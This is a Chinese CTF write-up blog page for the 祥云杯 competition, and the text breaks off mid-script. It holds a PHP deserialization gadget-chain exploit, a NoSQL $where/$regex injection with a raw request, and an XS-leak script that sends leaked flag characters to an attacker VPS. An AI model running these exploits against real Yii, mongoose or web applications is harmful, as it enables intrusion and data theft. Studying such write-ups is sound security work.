@@ -1,0 +1,561 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>祥云杯 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/10.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="祥云杯">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-30 13:06" pubdate>
+        2021年8月30日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      34
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">祥云杯</h1>
+            
+            <div class="markdown-body">
+              <h1 id="EZyii"><a href="#EZyii" class="headerlink" title="EZyii"></a>EZyii</h1><p>百度的链子可以直接打<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9948#toc-5">https://xz.aliyun.com/t/9948#toc-5</a></p>
+<p><code>stopProcess</code> 方法中存在</p>
+<p>利用 返回值可控的<code>__call</code> 和 字符串连接符 <code>.</code> ，将目标转向<code>__toString</code>，</p>
+<p>在这里找到了可利用点，跟进 <code>rewind</code></p>
+<p>下面断点的地方又可以走向其他类中的 <code>rewind</code> 方法，</p>
+<p>在这里可以看到很相似的调用。</p>
+<p>跟进 <code>read</code> 方法</p>
+<p>又要跳向其他类的 <code>read</code> 方法。</p>
+<p>利用<code>call_user_func</code>执行命令</p>
+<p>exp如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Psr7</span>\<span class="hljs-title">AppendStream</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$output</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$processes</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes[]=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-keyword">new</span> AppendStream());<br>            <span class="hljs-keyword">$this</span>-&gt;output=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-string">&#x27;jiang&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">DefaultGenerator</span><br>&#123;<br>    <span class="hljs-title">protected</span> $<span class="hljs-title">default</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;default = <span class="hljs-variable">$default</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Psr7</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">DefaultGenerator</span>;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppendStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$streams</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$seekable</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;streams[]=<span class="hljs-keyword">new</span> CachingStream();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CachingStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$remoteStream</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;remoteStream=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;stream=<span class="hljs-keyword">new</span>  PumpStream();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PumpStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>=-<span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$buffer</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;buffer=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-string">&#x27;j&#x27;</span>);<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;closure/autoload.php&quot;</span>);<br>            <span class="hljs-variable">$a</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;phpinfo();&#125;;<br>            <span class="hljs-variable">$a</span> = \Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-variable">$b</span> = unserialize(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;source=<span class="hljs-variable">$b</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="Package-Manager"><a href="#Package-Manager" class="headerlink" title="Package Manager"></a>Package Manager</h1><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>题目给了源码，审计一下，题目的界面里面有许多文本框，这里猜测可不可以xss一下，找到了源码，找到了许多，但都加了#转义，找到了一个！未转义的。</p>
+<p><img src="https://img-blog.csdnimg.cn/4141920159f046c6a6391a43732bb238.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>但是后来又在<code>app.ts</code>里面发现了csp防御很严格，基本无法实现xss。</p>
+<figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript">app.use(<span class="hljs-function">(<span class="hljs-params">req: Request, res: Response, next: NextFunction</span>) =&gt;</span> &#123;<br>    res.locals.session = req.session;<br>    res.locals.csrfToken = req.csrfToken();<br>    res.set(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);<br>    res.set(<span class="hljs-string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="hljs-string">&#x27;nosniff&#x27;</span>);<br>    next();<br>&#125;);<br></code></pre></div></td></tr></table></figure>
+
+<blockquote>
+<p>CSP 的实质就是白名单制度，开发者明确告诉客户端，<strong>哪些外部资源可以加载和执行，</strong>等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
+<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
+<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的Content-Security-Policy的字段。</p>
+<ul>
+<li><p><code>default-src</code> 限制全局,默认所有都会使用这种规则</p>
+</li>
+<li><p><code>script-src</code> 限制JavaScript的源地址。</p>
+</li>
+<li><p><code>style-src</code> 限制层叠样式表文件源。</p>
+</li>
+<li><p><code>img-src</code> 限制图片和图标的源地址等等</p>
+</li>
+</ul>
+<p> 例如 <strong>default-src ‘self’;</strong>  <strong>只允许同源下的资源</strong></p>
+<p> <strong>script-src ‘self’;</strong> <strong>只允许同源下的js</strong></p>
+<p> <strong>none</strong>  <strong>不允许任何内容。</strong></p>
+</blockquote>
+<p>但是这里可以插入<code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;2; URL=http://example.com/&quot; /&gt;</code> </p>
+<p>然后直接全局搜索了下flag，发现flag再admin用户里面的一个page页面上。题目也提供了admin 的xssbot，且用的是火狐浏览器。那么现在情景就是，我们需要某种方式获得admin页面的内容。</p>
+<p><img src="https://img-blog.csdnimg.cn/58b8441334b64f44b9189a2d2a318c5a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>下面的操作就让我学习了很久，突破口在packages路由中<code>/list</code>操作里面。这里接受了查询的search参数，然后用find查询。这里用的<code>mongoose</code>查询，可以用<code>&#123;&#39;$regex&#39;:xxx&#125;</code>实现查询，所以这里可以这样传入<code>/packages/list?search[description][$regex]=</code>来进行异或匹配flag。</p>
+<blockquote>
+<p>这样就符合xsleak的思路了。</p>
+<p>而具体leak的方法。我们使用<code>object</code>标签。它能在火狐环境下做到，如果<code>object.data</code>访问状态码200，就会触发onload事件。如果访问状态码404，就会触发onerror事件。我们根据这个差异性，就能利用search注出flag内容了。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/f32b2d870bd64daa973fc23ffb103040.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>但是这里还有个问题就是需要将url提交给admin，这里有个<code>auth</code>的过滤，$where操作需要让token和admin密码的hex_md5后的值相等，正常说这显然不太可能，所以这里想到污染$where操作，同样可以使用<code>/packages/list?search[$where]=hex_md5=function()&#123;return &#39;202cb962ac59075b964b07152d234b70&#39;&#125;</code>真是太神奇了。</p>
+<p><img src="https://img-blog.csdnimg.cn/1157c81da0c64307bf71295878e96701.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>贴一下wp的测试</p>
+<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;Math.floor = function () &#123; return 1 &#125;; return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;poyo&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;byc&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;byc&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br><span class="hljs-keyword">null</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>到这里思路大致就是先注册，然后add一篇文章，在description插入重定向到我们自己vps上的js脚本用模糊匹配出flag，然后在admin下提交我们的page，让bot访问我们重定向的脚本，来获取flag。</p>
+<p>先注册然后发一篇文章，重定向到我们的vps。server上写</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xssbotexp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">        vps = <span class="hljs-string">&#x27;http://39.107.239.30:80&#x27;</span></span><br><span class="javascript">        chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-+&#x27;</span></span><br><br><span class="javascript">        <span class="hljs-keyword">const</span> search = <span class="hljs-keyword">async</span> (url) =&gt;&#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="javascript">                <span class="hljs-keyword">const</span> object = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;object&quot;</span>);</span><br>                object.data = url;<br>                object.onload = resolve;<br>                object.onerror = reject;<br><span class="javascript">                <span class="hljs-built_in">document</span>.head.appendChild(object);</span><br>            &#125;);<br>        &#125;<br><br><span class="javascript">        <span class="hljs-keyword">const</span> exp = <span class="hljs-keyword">async</span> (url) =&gt;&#123;</span><br><span class="javascript">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="javascript">              <span class="hljs-keyword">await</span> search(url)</span><br><span class="javascript">              <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="javascript">            &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br>            &#125;<br>        &#125;<br><span class="javascript">        (<span class="hljs-keyword">async</span> () =&gt; &#123;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://6d7f5839-9b17-40fe-b5de-b04cfdae1037.node4.buuoj.cn:81/packages/list?search[description][$regex]=^<span class="hljs-subst">$&#123;flag&#125;</span>`</span></span><br><span class="javascript">            <span class="hljs-keyword">while</span> (flag.charAt(flag.length - <span class="hljs-number">1</span>) !== <span class="hljs-string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> chars ) &#123;</span><br><span class="javascript">                    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">await</span>(search(url + <span class="hljs-built_in">escape</span>(i))) ) &#123;</span><br><span class="javascript">                        url = url + <span class="hljs-built_in">escape</span>(i)</span><br>                        flag += i<br><span class="javascript">                        <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">`<span class="hljs-subst">$&#123;vps&#125;</span>/?flag=<span class="hljs-subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>&#125;)</span><br><span class="javascript">                        <span class="hljs-keyword">break</span>;</span><br><span class="javascript">                    &#125;   <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">                        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;failed&#x27;</span>);</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;)();<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+
+
+<p>先在search界面不断发包竞争</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/packages/list?search[$where]=hex_md5%3dfunction()&#123;return%20%27202cb962ac59075b964b07152d234b70%27&#125;;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1a52a622-4f18-49e5-9060-3394c76b953c.node4.buuoj.cn:81<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=eyJ1Ijp7IiBiIjoiZ0FTVk13QUFBQUFBQUFDTUFtNTBsSXdHYzNsemRHVnRsSk9VakJ0bFkyaHZJQ0ErSUM5MGJYQXZNVEV4bElXVVVwUXUifX0.YJDP-g.QEEJmYHE5PkdYKgl-zKi4lybDYo; session=s%3A60hAjRd2Nlts_fWYx7o_fnfOBx1H2lEs.tibY6R1rxcarL1x%2B8ucVTkXMFIhlryODzOsyi13uoMM<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br></code></pre></div></td></tr></table></figure>
+
+<p>直到auth提交token通过即可</p>
+<p><img src="https://img-blog.csdnimg.cn/80923db490644fac95f4eff48d60cc44.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>然后提交我们的文章id，在vps上开服务<code>python3 -m http.server 80</code>监听即可。</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这里其实在auth操作时存在注入，换个思路想，flag在admin用户的文章下，那将admin的密码注入出来不就行了。</p>
+<figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&#x27;http://6d7f5839-9b17-40fe-b5de-b04cfdae1037.node4.buuoj.cn:81/auth&#x27;</span><br>s = requests.session()<br>password = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">130</span>):<br>        cookies = &#123;<span 